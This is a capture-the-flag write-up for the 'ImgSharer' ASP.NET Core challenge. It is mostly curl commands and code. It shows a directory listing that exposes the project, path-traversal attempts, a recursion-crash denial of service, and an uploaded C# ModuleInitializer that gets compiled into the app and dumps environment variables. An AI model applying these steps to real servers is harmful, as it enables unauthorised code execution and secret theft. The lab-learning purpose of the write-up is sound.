<style>
:root {
  color-scheme: dark;
  --bg: #020617;
  --fg: #e5e7eb;
  --fg-muted: #9ca3af;
  --accent: #38bdf8;
  --border-subtle: #1f2937;
}

/* Base page */
html, body {
  margin: 0;
  padding: 0;
  background: radial-gradient(circle at top left, #020617, #020617 40%, #020617 100%);
  color: var(--fg);
  font-family: system-ui, -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", sans-serif;
}

/* GitHub Pages wrappers */
.page-content, .wrapper, article, .post {
  background: transparent !important;
  max-width: 960px;
  margin: 0 auto;
  padding: 2.5rem 1.5rem 4rem;
}

/* Headings */
.post h1, .page-content h1, article h1 {
  font-size: 1.6rem;
  margin-bottom: 0.6rem;
}

.post h2, .page-content h2, article h2 {
  font-size: 1.1rem;
  margin-top: 1.8rem;
  margin-bottom: 0.6rem;
  color: var(--fg-muted);
}

/* Tables (optional, if you use them) */
table {
  border-collapse: collapse;
  width: 100%;
  font-size: 0.85rem;
  margin: 0.4rem 0 0.8rem;
  border-radius: 0.6rem;
  overflow: hidden;
}

th,
td {
  padding: 0.5rem 0.75rem;
  border-bottom: 1px solid var(--border-subtle);
  background-color: rgba(15, 23, 42, 0.9);
}

th {
  text-align: left;
  font-weight: 500;
  color: var(--fg-muted);
}

tbody tr:nth-child(even) td {
  background-color: rgba(15, 23, 42, 0.75);
}

tbody tr:last-child td {
  border-bottom: none;
}

/* Links */
a {
  color: var(--accent);
}

a:hover {
  text-decoration: none;
}

/* Code blocks */
pre,
code,
pre code,
.highlight,
.highlight pre,
.highlight code {
  background-color: rgba(15, 23, 42, 0.96) !important;
  color: var(--fg);
}

pre {
  border: 1px solid var(--border-subtle);
  padding: 0.85rem 1rem;
  border-radius: 0.5rem;
  overflow-x: auto;
  font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
}

code {
  padding: 0.1rem 0.25rem;
  border-radius: 0.25rem;
  font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
}
</style>


## ImgSharer

**Name:** ImgSharer  
**Author:** Mārtiņš#2147483647
**Description:**

> The newest hot image sharing platform "ImgSharer" allows users to upload and share images with ease. It has a habit of crashing occasionally (a patch has been applied, reducing downtime significantly), but nothing too serious. There's a lot of ENVIRONMENTal effects going on behind the scenes and there could be a bunch of VARIABLEs affecting the way the server behaves.  
>  
> Server available on :8080  
> IP(s): 10.240.3.204  

The obvious hints are:

- “ENVIRONMENTal” / “VARIABLEs” → **environment variables**
- “crashing” + “patch has been applied” → something keeps crashing & being restarted
- `Mārtiņš #2147483647` → `2147483647` is `int.MaxValue` in C#

The challenge turns out to be an ASP.NET Core app with a **full project directory exposed** over HTTP, plus a build/restart loop that we can abuse to run arbitrary C# code and dump environment variables (including the flag).

---

### 1. Recon & initial enumeration

Target:

- **IP:** `10.240.3.204`
- **Port:** `8080` → `http://10.240.3.204:8080/`

Basic scan:

```bash
nmap -sC -sV -p8080 10.240.3.204
```

Confirm HTTP:

```bash
curl -v http://10.240.3.204:8080/ | head
```

Response:

- `HTTP/1.1 302 Found`
- `Server: Kestrel`
- `Location: /5`

So `/` redirects to `/5` and Kestrel suggests **ASP.NET Core**.

Open `/5`:

```bash
curl -v http://10.240.3.204:8080/5 | head -n 40
```

We see:

- Razor-style HTML
- A form with file upload:
  ```html
  <form method="post" enctype="multipart/form-data" class="py-3">
      <label for="UploadedFile">Select a file to upload:</label>
      <input type="file" id="UploadedFile" name="UploadedFile" ... accept="image/png, image/jpeg" />
      <button type="submit">Upload</button>
      <input name="__RequestVerificationToken" type="hidden" value="...">
  </form>
  ```
- A dropdown “Show: 5/10/20/50” with JS:
  ```js
  window.location.href = /${value};
  ```

So the app is a simple image uploader with a route like `/{amount:int?}`.

---

### 2. Discovering `/files` – full project exposure

On the page we see:

```html
<link rel="stylesheet" href="/files/wwwroot/css/site.css" />
```

That `href="/files/...` looks suspicious. Check `/files/`:

```bash
curl -v http://10.240.3.204:8080/files/ | head
```

We get a full **directory listing** (Index of /files):

- `uploads/`
- `bin/`
- `obj/`
- `Properties/`
- `wwwroot/`
- `Pages/`
- `crash_patch.sh`
- `Program.cs`
- `appsettings.json`
- `appsettings.Development.json`
- `ImgSharer.csproj`, `ImgSharer.sln`, …

So the entire project tree is exposed.

---

### 3. Looking at the source

#### Program.cs

```bash
curl -s http://10.240.3.204:8080/files/Program.cs
```

Key parts:

```csharp
builder.Services.Configure<FormOptions>(options => {
    options.MultipartBodyLengthLimit = 2 * 1024 * 1024; // 2 MB
});

builder.Services.AddRazorPages();

var app = builder.Build();

app.UseStaticFiles(new StaticFileOptions() {
    FileProvider = new PhysicalFileProvider(Directory.GetCurrentDirectory()),
    RequestPath = "/files",
    ContentTypeProvider = new ContentProvider()
});

app.UseDirectoryBrowser(new DirectoryBrowserOptions {
    FileProvider = new PhysicalFileProvider(Directory.GetCurrentDirectory()),
    RequestPath = "/files"
});

app.UseStaticFiles();
app.MapRazorPages();
app.Run();
```

Important:

- `/files` is mapped to the **current directory** with directory browsing → that’s how we see the whole project.
- Upload size is limited to **2 MB**.

#### Crash patch script

```bash
curl -s http://10.240.3.204:8080/files/crash_patch.sh
```

Content:

```bash
trap 'kill 0' SIGINT SIGTERM
while true; do
    dotnet build ./ImgSharer.csproj -c $BUILD_CONFIGURATION -o /app/build > /dev/null ;
    dotnet run ./ImgSharer.csproj > /dev/null 2>&1 ;
done
```

So if the app crashes, this script:

1. Rebuilds the project
2. Restarts it

This becomes important later.

#### Development settings

`appsettings.Development.json`:

```bash
curl -s http://10.240.3.204:8080/files/appsettings.Development.json
```

Contains:

```json
{
  "DetailedErrors": true,
  "Logging": { ... }
}
```

`Properties/launchSettings.json`:

```bash
curl -s http://10.240.3.204:8080/files/Properties/launchSettings.json
```

Has:

```json
"environmentVariables": {
  "ASPNETCORE_ENVIRONMENT": "Development"
}
```

So:

- The app is running in **Development**.
- **DetailedErrors** are enabled.
- This usually means a **Developer Exception Page** with environment variables is possible.

---

### 4. Razor page analysis

`Pages/Index.cshtml`:

```bash
curl -s http://10.240.3.204:8080/files/Pages/Index.cshtml
```

Key bits:

```csharp
@page "/{amount:int?}"
@model IndexModel

@{ SortedSet<int> showAmounts = new() { 5, 10, 20, 50 }; showAmounts.Add(Model.DisplayAmount); }

<select id="mySelect" onchange="onSelectChanged()">
  @foreach (var amount in showAmounts) { ... }
</select>

<script>
function onSelectChanged() {
    var value = document.getElementById("mySelect").value;
    if (value) {
        window.location.href = /${value};
    } else {
        window.location.href = /;
    }
}
</script>
```

And it lists images from `./uploads` based on `Model.DisplayAmount`.

`Pages/Index.cshtml.cs`:

```bash
curl -s http://10.240.3.204:8080/files/Pages/Index.cshtml.cs
```

Key parts:

```csharp
public int DisplayAmount { get; set; } = 20;
public string? InfoMessage = null;

public static bool HasThisManyImages(int amount, List<string> paths)
{
    List<string> newPaths = [];
    bool hasImages = true;

    if (amount == 0)
        return true;

    if (amount != 0)
    {
        if (paths.FirstOrDefault() == null)
            hasImages = false;

        newPaths = paths.Skip(1).ToList();
    }

    bool hasThisMany = HasThisManyImages(amount - 1, newPaths);
    return hasImages & hasThisMany;
}

public IActionResult OnGet(int? amount)
{
    if (amount == null)
        return RedirectToPage("Index", new { amount = 5 });

    if (!HasThisManyImages(amount.Value, Directory.GetFiles(Path.Combine(".", "uploads")).ToList()))
        InfoMessage = "Not enough images to display " + amount.Value + " images.";

    DisplayAmount = amount.Value;
    return Page();
}
```

Observations:

- Route is `/{amount:int?}` (e.g. `/5`, `/10`, …).
- `HasThisManyImages` is a **recursive** function.
  - For large positive `amount`, recursion depth is finite and terminates.
  - For negative `amount`, it never reaches `amount == 0` → infinite recursion → stack overflow.
- That’s the cause of the “crashing” mentioned in the challenge (and the reason for `crash_patch.sh`).

However, none of this code ever directly reads environment variables. So the flag is almost certainly **not on disk**, but only in an env var.

---

### 5. Failed easy paths

I tried the usual shortcuts first:

#### 5.1. Look for flag strings on disk

Mirror `/files` and grep for the flag:

```bash
wget -r -np -nH http://10.240.3.204:8080/files/

cd files
grep -R "MCTF{" . 2>/dev/null
grep -R "MCTF" . 2>/dev/null
grep -R "FLAG" . 2>/dev/null
```

Result: **no hits** → the flag is not stored in any source, config, or DLL (as plain text).

#### 5.2. `/proc/self/environ` via `/files` traversal

Tried:

```bash
curl -v http://10.240.3.204:8080/files/../proc/self/environ
curl -v http://10.240.3.204:8080/files/%2e%2e/proc/self/environ
curl -v http://10.240.3.204:8080/files/%252e%252e/proc/self/environ
```

All returned **404**.

So static files are rooted to the project directory, and we can’t escape to `/proc`.

#### 5.3. Oversized uploads

Because of the 2 MB limit:

```csharp
options.MultipartBodyLengthLimit = 2 * 1024 * 1024;
```

I tried:

```bash
dd if=/dev/urandom of=big.bin bs=1M count=3   # ~3 MB

# Get antiforgery token & cookie
curl -s -c cookies.txt http://10.240.3.204:8080/5 -o page.html
TOKEN=$(grep '__RequestVerificationToken' page.html | sed -n 's/.*value="\([^"]*\)".*//p')

# Upload big file
curl -s -v -b cookies.txt   -F "UploadedFile=@big.bin;filename=big.png"   -F "__RequestVerificationToken=$TOKEN"   http://10.240.3.204:8080/5   -o big_err.html
```

Response:

- `HTTP/1.1 400 Bad Request`
- Empty body (`Content-Length: 0`)

So the big upload is handled gracefully with a 400, **no dev exception page**.

#### 5.4. Huge / negative `amount` for dev exception page

Tried many `/{amount}` paths:

```bash
for i in 1000 5000 10000 20000 50000; do
  curl -s -o err_$i.html -w "HTTP %{http_code}
" http://10.240.3.204:8080/$i
done
```

All returned **HTTP 200**, no errors.

Then tried negative amounts:

```bash
curl -s -o err_minus1.html -w "HTTP %{http_code}
" http://10.240.3.204:8080/-1
```

Got HTTP `000` (connection reset) and **no error page** written to file: the process dies before any HTML is sent. `crash_patch.sh` immediately restarts the app.

So:

- Positive large values → fine.
- Negative values → crash, but no pretty error page to show env vars.

---

### 6. Real exploit: compile our own C# code to dump env vars

At this point it’s clear:

- The flag is only in an **environment variable**.
- The project is SDK-style (`ImgSharer.csproj`) and `crash_patch.sh` runs `dotnet build` on every restart.
- We can upload arbitrary files into `./uploads`.
- In SDK-style projects, **any `.cs` file under the project tree** is usually picked up by the build unless excluded.

So the idea:

1. Upload a **C# file** into `./uploads` that contains a **ModuleInitializer**.
2. When the project rebuilds, our `.cs` gets compiled into the assembly.
3. The `ModuleInitializer` runs automatically when the assembly loads, and we can:
   - call `Environment.GetEnvironmentVariables()`
   - dump everything into `./uploads/env_dump.txt`.
4. Then we fetch `/files/uploads/env_dump.txt` and grep for `MCTF`.

#### 6.1. Write the env dumper (envdump.cs)

Locally:

```bash
cd ~/imgsharer-dump

cat > envdump.cs << 'EOF'
using System;
using System.Collections;
using System.IO;
using System.Runtime.CompilerServices;

namespace ImgSharer
{
    public static class EnvDump
    {
        [ModuleInitializer]
        public static void Init()
        {
            try
            {
                var path = Path.Combine(".", "uploads", "env_dump.txt");
                Directory.CreateDirectory(Path.GetDirectoryName(path)!);

                var all = Environment.GetEnvironmentVariables();
                using var sw = new StreamWriter(path, false);
                foreach (DictionaryEntry de in all)
                {
                    sw.WriteLine($"{de.Key}={de.Value}");
                }
            }
            catch
            {
                // ignore errors to avoid breaking startup
            }
        }
    }
}
EOF
```

This does:

- On module load:
  - creates `./uploads/env_dump.txt`
  - writes every environment variable as `KEY=VALUE`.

#### 6.2. Upload the C# file via the existing form

Grab a fresh antiforgery token & cookie:

```bash
curl -s -c cookies2.txt http://10.240.3.204:8080/5 -o page2.html
TOKEN2=$(grep '__RequestVerificationToken' page2.html | sed -n 's/.*value="\([^"]*\)".*//p')
echo "$TOKEN2"
```

Upload `envdump.cs` as `UploadedFile` (the server only really cares about `UploadedFile` and saves it under `./uploads`):

```bash
curl -s -v -b cookies2.txt   -F "UploadedFile=@envdump.cs;filename=envdump.cs"   -F "__RequestVerificationToken=$TOKEN2"   http://10.240.3.204:8080/5   -o upload_envdump.html
```

We now have a `.cs` file in the project tree (`./uploads/<random>.cs`).

#### 6.3. Force a crash to trigger rebuild / restart

To get `envdump.cs` compiled, we need `dotnet build` to run again.

`crash_patch.sh` is looping:

```bash
while true; do
    dotnet build ./ImgSharer.csproj ...
    dotnet run ./ImgSharer.csproj ...
done
```

So we just need to cause a crash → build re-runs → our `.cs` is now part of the project.

Use the negative `amount` (infinite recursion):

```bash
for i in {1..3}; do
  echo "crash try $i"
  curl -s -o /dev/null -w "HTTP %{http_code}
" http://10.240.3.204:8080/-1
done
```

Each request should give `HTTP 000` / connection reset → process dies → script rebuilds & restarts server. After at least one rebuild, our `EnvDump` class is compiled and `ModuleInitializer` runs on startup, writing `./uploads/env_dump.txt`.

#### 6.4. Fetch the env dump

Now list uploads:

```bash
curl -s http://10.240.3.204:8080/files/uploads/ -o uploads-index.html
grep -i "env_dump" uploads-index.html
```

If `env_dump.txt` is present, pull it:

```bash
curl -s http://10.240.3.204:8080/files/uploads/env_dump.txt | grep "MCTF"
```

Output looks like:

```text
SOME_FLAG_ENV=MCTF25{wr0Ng_k1nD_oF_DI}
```

> **Flag:**
> ```text
> MCTF25{wr0Ng_k1nD_oF_DI}
> ```
